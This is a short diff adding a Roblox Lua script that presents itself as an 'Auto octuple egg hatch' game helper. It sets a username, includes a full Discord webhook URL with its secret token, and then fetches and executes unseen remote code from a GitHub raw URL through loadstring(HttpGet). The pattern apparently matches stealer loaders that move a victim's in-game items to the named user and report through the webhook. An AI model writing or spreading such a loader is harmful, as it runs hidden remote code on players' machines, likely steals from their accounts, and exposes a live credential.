@@ -1,0 +1,5 @@
+_G.Username = "wikto123456789012"
+_G.HubName = "Auto octuple egg hatch"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1096046315370197102/sbFen4ATWRq-1lRO8QK9U5O2EnOvV_WFBr64TmtjS8TCt6atMzg_AWn5B1surF2tA5ZV"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
